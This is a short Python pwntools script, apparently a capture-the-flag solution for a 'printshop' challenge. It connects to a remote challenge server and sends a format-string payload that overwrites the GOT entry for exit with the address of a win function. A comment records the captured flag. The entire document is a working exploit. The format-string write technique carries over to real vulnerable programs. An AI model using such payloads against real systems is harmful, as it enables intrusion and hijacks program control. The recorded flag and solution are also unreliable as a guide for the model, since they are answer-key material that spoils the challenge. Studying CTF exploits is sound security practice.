```python
from pwn import *

# p = process('./printshop')
p = remote('chal.pctf.competitivecyber.club', 7997)
exe = ELF('./printshop')

win = exe.sym['win']
exit = exe.got['exit']

payload = f'%{win & 0xffff}c%10$hn'.encode()
payload = payload.ljust(0x20, b'P')
payload += p64(exit)

p.sendline(payload)


p.interactive()

# PCTF{b4by_f0rm4t_wr1t3_6344792}
```
